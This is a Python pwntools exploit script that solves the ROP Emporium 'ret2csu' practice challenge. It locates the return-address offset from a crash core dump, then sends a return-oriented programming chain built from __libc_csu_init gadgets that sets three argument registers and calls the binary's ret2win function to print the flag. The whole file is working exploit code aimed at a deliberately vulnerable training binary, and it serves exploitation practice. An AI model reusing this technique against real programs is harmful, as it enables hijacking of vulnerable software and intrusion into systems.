# Check these resources for more info on the ret2csu technique (they helped me)
# https://bananamafia.dev/post/x64-rop-redpwn/
# https://blog.deveshmitra.com/ropemporium-ret2csu-write-up/
# https://github.com/shero4/ROP-Emporium-2020-writeup/blob/master/ret2csu/exploit.py

from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-peda
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './ret2csu'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of RSP (RIP) at the time of crashing
    rip_offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4))
    info('located RIP offset at {a}'.format(a=rip_offset))
    # Return the EIP offset
    return rip_offset


# Pass in pattern_size, get back EIP offset
offset = find_eip(cyclic(100))

# Start program
io = start()

# Function we need to execute to get flag
ret2win = 0x400510
# Address needed to put parameters in registers
pop_rdi = 0x4006a3  # pop rdi; ret
# We can't easily pop final param to rdx so we need this:
pop_rbx_rbp_r12_r13_r14_r15 = 0x40069a  # pop rbp; pop rbx; pop r12; pop r13; pop r14; pop r15; ret
csu_mov = 0x400680  # mov rdx, r15; mov rsi, r14; mov edi, r13, call QWORD PTR [r12+rbx*8]; ret

# Print out the target addresses/gadgets
info("%#x ret2win", ret2win)
info("%#x pop rdi; ret", pop_rdi)
info("%#x pop rbp; pop rbx; pop r12; pop r13; pop r14; pop r15; ret", pop_rbx_rbp_r12_r13_r14_r15)
info("%#x mov rdx, r15; mov rsi, r14; mov edi, r13, call QWORD PTR [r12+rbx*8]; ret", csu_mov)

# We need to pop params into RDI, RSI, RDX
payload = flat(
    asm('nop') * offset,
    pop_rbx_rbp_r12_r13_r14_r15,
    0x3,  # rbx (set to 3 because will be incremented and then compared to RBP)
    0x4,  # rbp
    0x600e30,  # r12 - ensures we can return to __libc_csu_init
    0xdeadbeefdeadbeef,  # r13 will be moved to rdi by csu_mov
    0xcafebabecafebabe,  # r14 will be moved to rsi by csu_mov
    0xd00df00dd00df00d,  # r15 will be moved to rdx by csu_mov
    csu_mov,  # Move params to where they need to be for function calls
    pack(0) * 7,  # Deal with the 6 pops
    pop_rdi,  # Pop deadbeef into RDI again
    0xdeadbeefdeadbeef,  # We only copied half over earlier (check debugger)
    ret2win  # pwn???
)

# gdb.attach(io, gdbscript='''
# init-pwndbg
# break *0x40069a
# break *0x400680
# break *0x400510
# ''')

# Send the payload to a new copy of the process
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

# Get our flag!
flag = io.recv()
success(flag)
